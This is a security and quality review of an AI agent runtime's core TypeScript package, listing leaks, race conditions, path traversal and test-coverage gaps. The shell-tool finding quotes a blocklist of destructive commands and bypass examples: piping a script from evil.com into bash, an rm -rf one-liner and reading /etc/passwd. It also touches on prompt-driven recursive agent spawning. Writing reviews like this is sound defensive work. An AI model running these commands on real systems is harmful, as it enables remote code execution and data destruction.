# Codebase Review: AI Agent Runtime

## Executive Summary

This comprehensive review covers all **92 files** in `packages/core/`, identifying **89 issues** across the codebase. The architecture is well-designed with clear separation of concerns, but several areas require attention for production readiness.

| Severity | Count |
|----------|-------|
| 🔴 Critical | 8 |
| 🟠 High | 19 |
| 🟡 Medium | 34 |
| 🔵 Low | 28 |

### Files Reviewed (92 total)

**Application Layer (3 files)**
- `application/initialization.test.ts`
- `application/initialization.ts`
- `application/orchestrator.ts`

**Core - Agents (4 files)**
- `core/agents/embeddings.ts`
- `core/agents/factory.ts`
- `core/agents/models.ts`
- `core/agents/roles.ts`

**Core - Embeddings (1 file)**
- `core/embeddings/index.ts`

**Core - Memory (17 files)**
- `core/memory/extraction.ts`
- `core/memory/extractor.test.ts`
- `core/memory/extractor.ts`
- `core/memory/factory.ts`
- `core/memory/index.test.ts`
- `core/memory/index.ts`
- `core/memory/memory-lite.ts`
- `core/memory/provider-base.ts`
- `core/memory/provider-graphiti.ts`
- `core/memory/provider-switching.test.ts`
- `core/memory/storage-sqlite.ts`
- `core/memory/storage.ts`
- `core/memory/storage/index.ts`
- `core/memory/storage/memory-storage.ts`
- `core/memory/storage/sqlite-storage.ts`
- `core/memory/storage/types.ts`
- `core/memory/types.ts`

**Core - RAG (21 files)**
- `core/rag/bm25.test.ts`
- `core/rag/bm25.ts`
- `core/rag/cache.ts`
- `core/rag/chunk-processor.ts`
- `core/rag/chunking.test.ts`
- `core/rag/chunking.ts`
- `core/rag/codebase-rag.ts`
- `core/rag/context.ts`
- `core/rag/index.ts`
- `core/rag/rerank.ts`
- `core/rag/search-engine.ts`
- `core/rag/strategies/base.ts`
- `core/rag/strategies/code-strategy.ts`
- `core/rag/strategies/document-strategy.test.ts`
- `core/rag/strategies/document-strategy.ts`
- `core/rag/strategies/index.ts`
- `core/rag/strategies/registry.test.ts`
- `core/rag/strategies/registry.ts`
- `core/rag/tokens.ts`
- `core/rag/types.ts`
- `core/rag/workspace-scanner.ts`

**Core - Tool Instrumentation (2 files)**
- `core/tool-instrumentation.test.ts`
- `core/tool-instrumentation.ts`

**Infrastructure (1 file)**
- `infrastructure/prompts/templates.ts`

**Runtime (1 file)**
- `runtime/agent-runtime.ts`

**Tools (40 files)**
- `tools/agent.ts`
- `tools/background-tasks-persistent.test.ts`
- `tools/background-tasks-persistent.ts`
- `tools/background-tasks/index.ts`
- `tools/background-tasks/task-database.ts`
- `tools/background-tasks/task-manager.test.ts`
- `tools/background-tasks/task-manager.ts`
- `tools/background-tasks/tools.ts`
- `tools/background-tasks/types.ts`
- `tools/codebase.ts`
- `tools/factory.ts`
- `tools/fetch-page.ts`
- `tools/filesystem.test.ts`
- `tools/filesystem.ts`
- `tools/filesystem/directory-operations.ts`
- `tools/filesystem/file-operations.ts`
- `tools/filesystem/index.ts`
- `tools/filesystem/path-security.test.ts`
- `tools/filesystem/path-security.ts`
- `tools/filesystem/tools.ts`
- `tools/filesystem/types.ts`
- `tools/index.ts`
- `tools/memory.ts`
- `tools/registry.test.ts`
- `tools/registry.ts`
- `tools/registry/index.ts`
- `tools/registry/registry.ts`
- `tools/registry/tools.ts`
- `tools/registry/types.ts`
- `tools/sequential-thinking.ts`
- `tools/shell.ts`
- `tools/tool-wrapper.test.ts`
- `tools/tool-wrapper.ts`
- `tools/utils/index.ts`
- `tools/utils/shell.test.ts`
- `tools/utils/shell.ts`
- `tools/utils/tool-result.test.ts`
- `tools/utils/tool-result.ts`
- `tools/web-search.ts`
- `tools/workflow.ts`

**Types & Entry (2 files)**
- `types/wink-bm25-text-search.d.ts`
- `index.ts`

---

## 🔴 Critical Issues (8)

### C1. Memory Leak in SQLite Storage Checkpoint Interval
**File:** `core/memory/storage/sqlite-storage.ts`

```typescript
const checkpointInterval = setInterval(() => {
  try {
    db.pragma('wal_checkpoint(TRUNCATE)');
  } catch {
    // Ignore checkpoint errors - database may be closed
  }
}, 60000);
```

**Problem:** If an exception occurs during schema initialization (lines 42-45), the interval is never cleared. Additionally, if `createSQLiteStorage` is called multiple times without closing, intervals accumulate indefinitely.

**Impact:** Memory leak, zombie intervals, potential resource exhaustion.

**Fix:** 
```typescript
try {
  db.pragma('journal_mode = WAL');
  db.exec(SCHEMA);
} catch (error) {
  clearInterval(checkpointInterval);
  db.close();
  throw error;
}
```

---

### C2. Race Condition in Memory Provider Singleton
**File:** `tools/memory.ts`

```typescript
let memoryProviderPromise: Promise<MemoryProvider> | null = null;

export async function closeMemory(): Promise<void> {
  if (memoryProviderPromise) {
    const provider = await memoryProviderPromise;
    await provider.close();
    memoryProviderPromise = null;  // Race condition here
  }
}
```

**Problem:** Setting `memoryProviderPromise = null` after close creates a race where concurrent calls to `getProvider()` during shutdown will create a new provider.

**Impact:** Database corruption, resource leaks, undefined behavior.

**Fix:** Add closing state flag and mutex pattern.

---

### C3. Command Injection via Shell Tool
**Files:** `tools/shell.ts`, `tools/utils/shell.ts`

```typescript
const DANGEROUS_PATTERNS = [
  /rm\s+(-rf?|--recursive)?\s*[\/~]/i,
  />\s*\/dev\/sd[a-z]/i,
  /mkfs\./i,
  /dd\s+if=/i,
  /:(){ :|:& };:/,
];
```

**Problem:** Blocklist approach is fundamentally flawed. Bypasses include:
- `curl http://evil.com/script.sh | bash`
- `python -c "import os; os.system('rm -rf /')"`
- `perl -e 'system("dangerous")'`
- `$(cat /etc/passwd)`
- Base64 encoded commands
- Environment manipulation

**Impact:** Complete system compromise.

**Fix:** Implement container-based sandboxing or strict allowlist.

---

### C4. Unvalidated Path Traversal via Symlinks
**File:** `tools/filesystem/path-security.ts`

```typescript
export async function validateNewPath(targetPath: string): Promise<string> {
  // ...validates path before file exists
  if (!isPathWithinAllowedDirectories(resolvedPath)) {
    throw new Error(`Access denied...`);
  }
  // But what if someone creates a symlink pointing outside?
```

**Problem:** Validates path before file creation but doesn't re-validate after. An attacker could create a symlink inside allowed directory pointing outside.

**Impact:** Arbitrary file read/write outside sandbox.

**Fix:** Re-validate with `fs.realpath()` after any file operation.

---

### C5. Unbounded Memory in Sequential Thinking
**File:** `tools/sequential-thinking.ts`

```typescript
export class SequentialThinkingEngine {
  private thoughtHistory: ThoughtData[] = [];
  private branches: Record<string, ThoughtData[]> = {};
```

**Problem:** No limits on array growth. Long agent sessions accumulate unlimited thoughts.

**Impact:** Memory exhaustion, OOM crashes.

**Fix:** Implement max size with LRU eviction or circular buffer.

---

### C6. Unbounded Memory in Plan Tool
**File:** `tools/workflow.ts`

```typescript
let currentPlan: Plan | null = null;  // Global mutable state

export const planTool = tool({
  // ...
  case 'add_step':
    currentPlan.steps.push({ name: stepName, status: 'pending' });
```

**Problem:** 
1. Global mutable state is not session-scoped
2. No limit on steps array growth
3. Multiple concurrent sessions share the same plan

**Impact:** Memory exhaustion, data corruption between sessions.

**Fix:** Make plan session-scoped, add step limits.

---

### C7. Parser Factory Resource Leak
**File:** `core/rag/strategies/code-strategy.ts`

```typescript
export class CodeChunkingStrategy extends BaseChunkingStrategy {
  private parserFactory: ParserFactory | null = null;

  private async getParserFactory(): Promise<ParserFactory> {
    if (!this.parserFactory) {
      this.parserFactory = createParserFactory();
    }
    return this.parserFactory;
  }
```

**Problem:** `createParserFactory()` likely allocates native resources (tree-sitter parsers). While `dispose()` exists, it's not automatically called and there's no finalizer.

**Impact:** Native memory leak if strategy is garbage collected without dispose.

**Fix:** Implement weak reference pattern or ensure dispose is always called.

---

### C8. Uncontrolled Agent Spawning Recursion
**File:** `tools/background-tasks/tools.ts`

```typescript
export const startAgentTaskTool = tool({
  // ...
  const agentScript = `
const { createAgentRuntime } = require('@agent/core');
// ...
    disableAgentSpawning: true,  // Only disabled in script
```

**Problem:** While `disableAgentSpawning` is set in the generated script, there's no server-side enforcement. A malicious prompt could potentially craft a different script.

**Impact:** Fork bomb via recursive agent spawning.

**Fix:** Enforce spawning limits at runtime level, not just script generation.

---

## 🟠 High Priority Issues (19)

### H1. Type Safety - Pervasive `any` Usage
**Files:** Multiple

```typescript
// core/agents/models.ts
export const models: any = { ... }

// application/orchestrator.ts  
export function createAgent(tools: Record<string, any>, ...)

// core/rag/codebase-rag.ts
let codebaseRAG: any = null;

// tools/registry/registry.ts
execute: async (args: any) => { ... }
```

**Count:** 47 instances of `any` across codebase.

**Fix:** Create proper type definitions:
```typescript
interface ToolExecuteResult { ... }
interface ModelConfig { ... }
```

---

### H2. Missing Rate Limiting
**Files:** `tools/web-search.ts`, `tools/fetch-page.ts`, `core/embeddings/index.ts`

**Problem:** No rate limiting on external API calls (Brave, Tavily, OpenAI, Cohere).

**Impact:** API quota exhaustion, IP bans, cost overruns.

**Fix:** Implement rate limiter with token bucket or sliding window.

---

### H3. No Graceful Shutdown Handlers
**File:** `runtime/agent-runtime.ts`

**Problem:** No SIGTERM/SIGINT handlers. Process termination leaves:
- Background tasks orphaned
- Database connections open
- Memory extractor with pending work

**Fix:**
```typescript
process.on('SIGTERM', async () => {
  await runtime.shutdown();
  process.exit(0);
});
```

---

### H4. Inconsistent Error Handling
**Files:** All tool files

Three different patterns used:
```typescript
// Pattern 1: tools/memory.ts
return JSON.stringify({ error: error.message });

// Pattern 2: tools/shell.ts
return error('Command blocked', { command });

// Pattern 3: tools/filesystem/*
throw new Error(`Access denied`);
```

**Fix:** Standardize on `success()`/`error()` utilities from `tools/utils/tool-result.ts`.

---

### H5. Missing Error Propagation in Task Manager
**File:** `tools/background-tasks/task-manager.ts`

```typescript
proc.on('exit', (code: number | null) => {
  try {
    if (this.db.open) {
      this.db.prepare(...).run(...);
    }
  } catch (err) {
    logger.debug('Could not update task status on exit', ...);  // Silent failure
  }
```

**Problem:** DB update failures are silently logged at debug level. Task stays "running" forever.

**Fix:** Implement retry logic or mark as orphaned.

---

### H6. Hardcoded Test Dependencies on Real APIs
**Files:** `core/memory/index.test.ts`, `core/memory/provider-switching.test.ts`

```typescript
const hasRealApiKeys =
  process.env.OPENROUTER_API_KEY &&
  !process.env.OPENROUTER_API_KEY.includes('test') &&
  !process.env.CI;
```

**Problem:** Integration tests skip in CI, meaning critical paths are untested in pipelines.

**Fix:** Use mocking or dedicated test API endpoints.

---

### H7. SQL Injection in Dynamic Queries
**File:** `core/memory/storage/sqlite-storage.ts`

```typescript
async update(id, updates) {
  const sets: string[] = [];
  const vals: any[] = [];
  if (updates.name) { sets.push('name = ?'); vals.push(updates.name); }
  // ...
  db.prepare(`UPDATE entities SET ${sets.join(', ')} WHERE id = ?`).run(...vals);
}
```

**Problem:** While parameterized, the dynamic column selection could be manipulated if `updates` keys aren't validated.

**Fix:** Whitelist allowed column names explicitly.

---

### H8. Deadlock Risk in Async Transactions
**File:** `core/memory/storage/sqlite-storage.ts`

```typescript
async transaction<T>(fn: () => Promise<T>) {
  db.exec('BEGIN');
  try {
    const result = await fn();  // Async callback with sync DB
    db.exec('COMMIT');
```

**Problem:** better-sqlite3 is synchronous. Async callbacks could interleave operations causing "cannot start transaction within transaction" errors.

**Fix:** Use synchronous transaction or implement proper async handling.

---

### H9. Missing Connection Pooling for HTTP
**File:** `core/memory/provider-graphiti.ts`

```typescript
private async request(path: string, method: string, body?: unknown) {
  const response = await fetch(`${this.graphitiUrl}${path}`, {
```

**Problem:** Every request creates new connection. High-frequency ops exhaust connection limits.

**Fix:** Use `undici` with connection pooling or configure keep-alive.

---

### H10. Log Injection Vulnerability
**Files:** All files using logger

```typescript
logger.info(`⏱️  [${toolName}] Starting`, { args });
```

**Problem:** User-controlled values logged directly. ANSI injection, log spoofing possible.

**Fix:** Sanitize all logged user inputs.

---

### H11. Embedding Dimension Mismatch Silent Failure
**File:** `core/embeddings/index.ts`

```typescript
export function cosineSimilarity(a: number[], b: number[]): number {
  if (a.length !== b.length || a.length === 0) return 0;  // Silent!
```

**Problem:** Returns 0 without warning when dimensions mismatch. Model changes break search silently.

**Fix:** Log warning and consider throwing error.

---

### H12. Cache Poisoning via Hash Collision
**File:** `core/rag/cache.ts`

```typescript
const getCachePath = (key: string): string => {
  const hash = crypto.createHash('md5').update(key).digest('hex');
  return path.join(cacheDir, `${hash}.json`);
};
```

**Problem:** MD5 is cryptographically broken. Collision attacks could poison cache.

**Fix:** Use SHA-256.

---

### H13. Insufficient Input Validation in Tools
**File:** `tools/background-tasks/tools.ts`

```typescript
inputSchema: z.object({
  command: z.string(),  // No length limit
  cwd: z.string().optional(),  // No path validation
}),
```

**Problem:** No constraints on command length, path format. DoS via huge commands.

**Fix:** Add `.max(10000)` and path validation.

---

### H14. Missing Timeout on Database Operations
**File:** `core/memory/storage/sqlite-storage.ts`

**Problem:** No timeout on SQLite operations. Disk issues could hang forever.

**Fix:** Use `busy_timeout` pragma and operation timeouts.

---

### H15. Unhandled Rejection in Memory Extractor
**File:** `runtime/agent-runtime.ts`

```typescript
memoryExtractor.extractFromConversation(conversationHistory).catch(error => {
  logger.error('Background memory extraction failed', { error: String(error) });
});
```

**Problem:** If `extractFromConversation` throws synchronously (not rejects), it's uncaught.

**Fix:** Wrap in `Promise.resolve().then()` or try-catch.

---

### H16. No Validation on Rerank Results
**File:** `core/rag/rerank.ts`

```typescript
export async function rerankWithFallback(...): Promise<RerankResult[]> {
  try {
    return await rerankDocuments(query, documents, options);
  } catch {
    return documents.slice(0, options.topN || 20).map(...);  // Fallback
  }
}
```

**Problem:** Silently falls back on any error, including partial results. May return stale/wrong data.

**Fix:** Log the error, consider propagating certain error types.

---

### H17. Context Window Trimming Loses Important Messages
**File:** `application/orchestrator.ts`

```typescript
if (messages.length > MAX_CONTEXT_MESSAGES) {
  finalMessages = [
    messages[0],  // Keep first (system prompt?)
    ...messages.slice(-(MAX_CONTEXT_MESSAGES - 1)),  // Keep recent
  ];
}
```

**Problem:** Arbitrary trimming may lose critical context. No summarization.

**Fix:** Implement smart summarization or importance-based pruning.

---

### H18. Prompt Injection via System Prompt Template
**File:** `infrastructure/prompts/templates.ts`

```typescript
export const systemPrompt = `You are an autonomous agent...
# Capabilities
**Always available:**
- sequential_thinking - Record deep reasoning steps...
```

**Problem:** If user input is interpolated into prompts elsewhere, injection attacks possible.

**Fix:** Ensure strict separation of system and user content.

---

### H19. Strategy Registry Doesn't Validate File Content
**File:** `core/rag/strategies/registry.ts`

```typescript
async chunkFile(content: string, filePath: string): Promise<Chunk[]> {
  const strategy = this.getStrategy(filePath);
  // No content size validation before chunking
```

**Problem:** Extremely large files could cause memory exhaustion during chunking.

**Fix:** Add file size limits before processing.

---

## 🟡 Medium Priority Issues (34)

### M1. Magic Numbers Scattered Throughout
**Files:** Multiple

```typescript
// application/orchestrator.ts
const MAX_CONTEXT_MESSAGES = 50;

// core/rag/codebase-rag.ts
rerankTopN = 100,
returnTopN = 8,
maxTokensPerSearch = 3000,

// core/rag/context.ts
maxOutputTokens: 150,
temperature: 0.3,

// tools/background-tasks/task-manager.ts
private maxLogSize = 100 * 1024 * 1024;
private readonly MAX_CONCURRENT_TASKS = 50;

// core/memory/extractor.ts
const MAX_CONSECUTIVE_FAILURES = 3;
```

**Fix:** Centralize in a config module.

---

### M2. Inconsistent Async/Sync Patterns
**Files:** `tools/agent.ts`, `tools/workflow.ts`

```typescript
// eslint-disable-next-line @typescript-eslint/require-await
execute: async ({ summary }) => {
  // Synchronous code
```

**Problem:** Disabling ESLint instead of fixing. Adds promise overhead.

---

### M3. Missing Input Sanitization in BM25
**File:** `core/rag/bm25.ts`

```typescript
addDocument(doc: BM25Document): void {
  if (isConsolidated) throw new Error('...');
  // No doc.content size check
  engine.addDoc({...}, doc.id);
```

---

### M4. Resource Leak in File Streams
**File:** `tools/filesystem/file-operations.ts`

```typescript
return new Promise((resolve, reject) => {
  const stream = createReadStream(filePath);
  // No cleanup if promise times out externally
```

---

### M5. Missing Pagination Support
**File:** `tools/registry/tools.ts`

```typescript
execute: async ({ query, limit = 5 }) => {
  // No offset parameter for pagination
```

---

### M6. Inconsistent Date Handling
**Files:** Multiple

```typescript
// Date objects
createdAt: new Date(),

// Timestamps
startTime: Date.now(),

// ISO strings
created_at: new Date().toISOString(),
```

---

### M7. Missing Tool Activation Validation
**File:** `tools/tool-wrapper.ts`

```typescript
activate(toolName: string): boolean {
  // Doesn't validate toolName exists in registry
  this.activeTools.add(toolName);
```

---

### M8. No Depth Limit in Directory Tree
**File:** `tools/filesystem/directory-operations.ts`

```typescript
export async function buildDirectoryTree(
  dirPath: string,
  excludePatterns?: string[]
): Promise<DirectoryTree> {
  // Recursive with no depth limit - stack overflow risk
```

---

### M9. Missing Health Checks at Startup
**File:** `runtime/agent-runtime.ts`

**Problem:** No validation that Ollama/OpenRouter/Graphiti are reachable before accepting requests.

---

### M10. Overly Broad Catch Clauses
**Files:** Multiple

```typescript
// core/rag/strategies/code-strategy.ts
} catch {
  return this.chunkFallback(content, filePath);  // No logging
}

// core/rag/cache.ts
} catch (error) {
  logger.debug('Cache miss or read error', { key, error });
  return null;
}
```

---

### M11. Missing Content-Type Validation
**File:** `tools/fetch-page.ts`

```typescript
const html = await response.text();
const dom = new JSDOMClass(html, { url });
// Assumes HTML without checking Content-Type
```

---

### M12. No Database Index for Common Queries
**File:** `core/memory/storage/sqlite-storage.ts`

```typescript
// Missing indexes for:
// - episodes.group_id lookups
// - facts by entity_id (stored as JSON)
```

---

### M13. Unbounded Log File Growth
**File:** `tools/background-tasks/task-manager.ts`

```typescript
private maxLogSize = 100 * 1024 * 1024;  // 100MB per task
// 50 tasks × 100MB = 5GB potential
// No global limit
```

---

### M14. Test Promise Handling Inconsistency
**File:** `core/memory/extractor.test.ts`

```typescript
await extractor.extractFromConversation(messages);
await extractor.waitForPending();
// Production code may not call waitForPending consistently
```

---

### M15. Inconsistent Null/Undefined Usage
**Files:** Multiple

```typescript
validTo: row.valid_to ? new Date(row.valid_to) : null,
pid: row.pid ?? undefined,
errorLogFile?: string;
```

---

### M16. Missing Retry Logic for Network Operations
**File:** `core/embeddings/index.ts`

```typescript
async embed(text: string): Promise<number[]> {
  const result = await embed({ model, value: text });  // No retry
```

---

### M17. Document Chunking Size Not Validated
**File:** `core/rag/strategies/document-strategy.ts`

```typescript
constructor(options: DocumentChunkingOptions = {}) {
  this.options = {
    maxChunkSize: options.maxChunkSize ?? 1000,  // But content not validated
```

---

### M18. Workspace Scanner Silently Skips Errors
**File:** `core/rag/workspace-scanner.ts`

```typescript
} catch (error) {
  log(`Failed to chunk file ${fullPath}: ${error}`);
  // Continues without propagating - partial results
}
```

---

### M19. Model Selection Has No Validation
**File:** `core/agents/models.ts`

```typescript
export const models: any = {
  fast: () => {
    const modelName = process.env.MODEL_FAST || 'deepseek/deepseek-chat-v3-0324:free';
    // No validation that model exists or is accessible
```

---

### M20. Chunking Fallback Loses Metadata
**File:** `core/rag/strategies/code-strategy.ts`

```typescript
private chunkFallback(content: string, filePath: string): Chunk[] {
  // Returns chunks without name, type info that AST would provide
  return chunks.push({
    metadata: { type: 'block', language: 'unknown' },
```

---

### M21. BM25 Consolidation Prevents Updates
**File:** `core/rag/bm25.ts`

```typescript
consolidate(): void {
  if (!isConsolidated) {
    engine.consolidate();
    isConsolidated = true;
  }
}

addDocument(doc: BM25Document): void {
  if (isConsolidated) {
    throw new Error('Cannot add documents after consolidation');
  }
```

**Problem:** No way to add documents after consolidation. Index must be rebuilt entirely.

---

### M22. Token Counting Assumes GPT-4 Tokenizer
**File:** `core/rag/tokens.ts`

```typescript
import { encode } from 'gpt-tokenizer';

export function countTokens(text: string): number {
  const tokens = encode(text);
  // Assumes GPT-4o tokenizer for all models
```

---

### M23. Context Generation Concurrency Not Configurable
**File:** `core/rag/context.ts`

```typescript
export async function generateContextBatch(
  chunks: CodeChunk[],
  options: {
    concurrency?: number;
    delayMs?: number;
  } = {}
): Promise<ContextualChunk[]> {
  const { concurrency = 5, delayMs = 100 } = options;
  // Should be configurable at higher level
```

---

### M24. Graphiti Provider Missing Retry Logic
**File:** `core/memory/provider-graphiti.ts`

```typescript
private async request(path: string, method: string, body?: unknown) {
  const response = await fetch(...);
  if (!response.ok) {
    throw new Error(`Graphiti API error: ${response.status}`);
    // No retry for transient failures
```

---

### M25. Entity Conflict Resolution Always Uses LLM
**File:** `core/memory/extraction.ts`

```typescript
export async function resolveEntityConflicts(...) {
  // Fast path exists but still calls LLM for complex cases
  // Could be expensive for bulk operations
```

---

### M26. Batch Contradiction Detection No Chunking
**File:** `core/memory/extraction.ts`

```typescript
export async function detectContradictionsBatch(
  newFacts: string[],
  existingFacts: string[],
  model
): Promise<BatchContradictionResult[]> {
  // No chunking for large fact sets - could exceed context
```

---

### M27. Memory Extractor State Not Persisted
**File:** `core/memory/extractor.ts`

```typescript
let lastProcessedIndex = -1;
// Lost on restart - may reprocess messages
```

---

### M28. In-Memory Storage CosineSimilarity Imported Twice
**File:** `core/memory/storage/memory-storage.ts`

```typescript
import { cosineSimilarity } from '../../embeddings/index.js';
// Also used in sqlite-storage.ts - consider shared utility
```

---

### M29. Provider Factory Detection Has Timeout Issues
**File:** `core/memory/factory.ts`

```typescript
export async function detectAvailableProvider(...) {
  try {
    const response = await fetch(`${url}/healthcheck`, {
      signal: AbortSignal.timeout(2000),  // Short timeout
    });
    // May fail on slow networks, falling back unnecessarily
```

---

### M30. Tool Factory Error Handling Incomplete
**File:** `tools/factory.ts`

```typescript
createAll(deps: ToolDependencies): ToolSet {
  for (const [name, creator] of this.factories.entries()) {
    try {
      const tools = creator(deps);
      Object.assign(allTools, tools);
    } catch (e) {
      // Silent catch - should at least log
```

---

### M31. Filesystem Tools Don't Validate Path Length
**File:** `tools/filesystem/tools.ts`

```typescript
inputSchema: z.object({
  path: z.string(),  // No max length
```

---

### M32. Search Files Glob Pattern Not Validated
**File:** `tools/filesystem/directory-operations.ts`

```typescript
export async function searchFilesWithValidation(
  searchPath: string,
  pattern: string,  // Could be malicious glob like **/**/**/*
```

---

### M33. Tool Instrumentation Only Works with JSON Results
**File:** `core/tool-instrumentation.ts`

```typescript
if (typeof result === 'string') {
  try {
    const parsed = JSON.parse(result);
    parsed._timing = { durationMs: durationMs.toFixed(2) };
    return JSON.stringify(parsed) as TResult;
  } catch {
    return result;  // Non-JSON results don't get timing
```

---

### M34. Registry Search Threshold Not Configurable
**File:** `tools/registry/registry.ts`

```typescript
async searchSemantic(...): Promise<ToolMetadata[]> {
  const { threshold = 0.3 } = options;  // Hardcoded default
```

---

## 🔵 Low Priority Issues (28)

### L1. Missing JSDoc Documentation
**Problem:** Most public functions lack JSDoc comments.

### L2. Console.log Instead of Logger
**File:** `application/orchestrator.ts`
```typescript
console.log('\n' + '═'.repeat(80));
```

### L3. Test Files Mixed with Source
Tests are co-located (`*.test.ts`) instead of in `__tests__/`.

### L4. Unused Exports
- `toolGroups` in `tools/workflow.ts`
- `disposeParserFactory` in `core/rag/chunking.ts`

### L5. Missing Error Codes
Errors use string messages only, no error codes for programmatic handling.

### L6. No Version Information
**File:** `index.ts` - No version constant.

### L7. Inconsistent File Naming
- `background-tasks-persistent.ts`
- `tool-wrapper.ts`
- `codebase-rag.ts`

### L8. Re-export Files Could Cause Circular Dependencies
**Files:** `tools/index.ts`, `core/memory/index.ts`

### L9. No Telemetry/Observability Integration
No OpenTelemetry or similar.

### L10. Browser Detection Could Be Bypassed
**File:** `index.ts`
```typescript
const isBrowser = typeof window !== 'undefined';
// Edge runtimes may bypass
```

### L11. Dead Code - mergeAttributes
**File:** `core/memory/extraction.ts`
```typescript
function mergeAttributes(...) // Only called internally
```

### L12. Missing Return Type Annotations
Many functions use type inference instead of explicit returns.

### L13. Inconsistent Import Styles
Some use `import type`, others don't separate type imports.

### L14. No Input Sanitization in wink-bm25 Types
**File:** `types/wink-bm25-text-search.d.ts`
Declares types but no runtime validation.

### L15. CORE_TOOL_NAMES Not Type-Safe
**File:** `application/initialization.ts`
```typescript
export const CORE_TOOL_NAMES = [...] as const;
// Should use enum or stricter typing
```

### L16. Agent Roles Not Extensible
**File:** `core/agents/roles.ts`
```typescript
export type AgentRole = keyof typeof systemPrompts;
// Adding new roles requires modifying this file
```

### L17. embeddings.ts Is Just Re-exports
**File:** `core/agents/embeddings.ts`
```typescript
export { getEmbeddingModel, cosineSimilarity, createEmbeddingService } from '../embeddings/index.js';
// Consider removing indirection
```

### L18. RAG Types Split Across Files
**Files:** `core/rag/types.ts`, `core/rag/strategies/base.ts`
Types are scattered, hard to find.

### L19. Storage Adapter Interface Incomplete
**File:** `core/memory/storage/types.ts`
```typescript
interface StorageAdapter {
  // Missing bulk operations, missing clear()
```

### L20. Provider Base Class Validation Empty
**File:** `core/memory/provider-base.ts`
```typescript
protected validateAddResult(result: ...): void {
  // Empty - placeholder?
}
```

### L21. Tool Result Utilities Not Used Everywhere
**File:** `tools/utils/tool-result.ts`
Good utilities exist but inconsistently used.

### L22. Shell Options Interface Could Be Shared
**File:** `tools/utils/shell.ts`
```typescript
export interface ShellOptions {
// Duplicated in multiple places
```

### L23. Background Task Types Not Exported from Main
**File:** `index.ts`
```typescript
export { type PersistentTaskInfo, type TaskStatus }
// But TaskMonitorCallback not exported
```

### L24. Tool Description Truncation in Search
**File:** `tools/registry/tools.ts`
```typescript
description: m.description,  // Could be very long
// Consider truncating for display
```

### L25. Redundant Re-export Files
- `tools/filesystem.ts` → just re-exports `tools/filesystem/index.ts`
- `tools/registry.ts` → just re-exports `tools/registry/index.ts`

### L26. Test Cleanup Inconsistent
**File:** `tools/background-tasks-persistent.test.ts`
```typescript
afterEach(() => {
  resetPersistentTaskManager();
  // Sometimes also deletes files, sometimes not
```

### L27. SafeJsonParse Repeated
**File:** `core/memory/storage/sqlite-storage.ts`
```typescript
function safeJsonParse<T>(...) // Similar functions in multiple files
```

### L28. No Graceful Degradation for Missing Dependencies
**File:** `tools/web-search.ts`
```typescript
if (!apiKey) throw new Error('BRAVE_API_KEY not set');
// Could offer alternative or clearer guidance
```

---

## Architecture Observations

### Strengths
1. **Clear module boundaries** - Application, Core, Infrastructure, Runtime, Tools
2. **Strategy pattern** for chunking - easily extensible
3. **Registry pattern** for tools - enables dynamic loading
4. **Provider abstraction** for memory - switchable backends
5. **Comprehensive test coverage** for utilities

### Weaknesses
1. **Global mutable state** - `currentPlan`, `globalEngine`, singletons
2. **Mixed async patterns** - sync DB with async wrappers
3. **Error handling inconsistency** - three different patterns
4. **Configuration scattered** - magic numbers throughout
5. **Security relies on blocklists** - shell, paths

---

## Recommendations Summary

### Immediate (Critical)
1. ✅ Fix SQLite checkpoint interval leak
2. ✅ Implement proper shell sandboxing
3. ✅ Add symlink attack protection
4. ✅ Bound all unbounded collections
5. ✅ Add agent spawning limits at runtime level

### Short-term (High)
1. Add rate limiting to all external APIs
2. Implement graceful shutdown handlers
3. Standardize error handling on utility functions
4. Add proper TypeScript types (eliminate `any`)
5. Add retry logic with exponential backoff

### Medium-term (Medium)
1. Centralize configuration
2. Add connection pooling
3. Implement smart context trimming
4. Add database indexes
5. Standardize date/time handling

### Long-term (Low + Tech Debt)
1. Add comprehensive JSDoc
2. Implement OpenTelemetry
3. Move to container-based sandboxing
4. Add chaos engineering tests
5. Create type-safe configuration system

---

## Test Coverage Gaps

| Module | Test File | Coverage Notes |
|--------|-----------|----------------|
| `application/initialization` | ✅ | Good coverage |
| `core/agents/*` | ❌ | No tests |
| `core/embeddings/*` | ❌ | No tests |
| `core/memory/extraction` | ❌ | No direct tests |
| `core/memory/extractor` | ✅ | Basic coverage |
| `core/memory/*` | ✅ | Integration tests |
| `core/rag/bm25` | ✅ | Good coverage |
| `core/rag/chunking` | ✅ | Good coverage |
| `core/rag/cache` | ❌ | No tests |
| `core/rag/context` | ❌ | No tests |
| `core/rag/rerank` | ❌ | No tests |
| `core/rag/search-engine` | ❌ | No tests |
| `core/rag/strategies/*` | ✅ | Partial coverage |
| `core/rag/tokens` | ❌ | No tests |
| `core/tool-instrumentation` | ✅ | Good coverage |
| `runtime/agent-runtime` | ❌ | No tests |
| `tools/agent` | ❌ | No tests |
| `tools/background-tasks/*` | ✅ | Good coverage |
| `tools/codebase` | ❌ | No tests |
| `tools/fetch-page` | ❌ | No tests |
| `tools/filesystem/*` | ✅ | Good coverage |
| `tools/memory` | ❌ | No tests |
| `tools/registry/*` | ✅ | Good coverage |
| `tools/sequential-thinking` | ❌ | No tests |
| `tools/shell` | ❌ | No direct tests |
| `tools/tool-wrapper` | ✅ | Good coverage |
| `tools/utils/*` | ✅ | Good coverage |
| `tools/web-search` | ❌ | No tests |
| `tools/workflow` | ❌ | No tests |

**Estimated overall coverage: ~40%**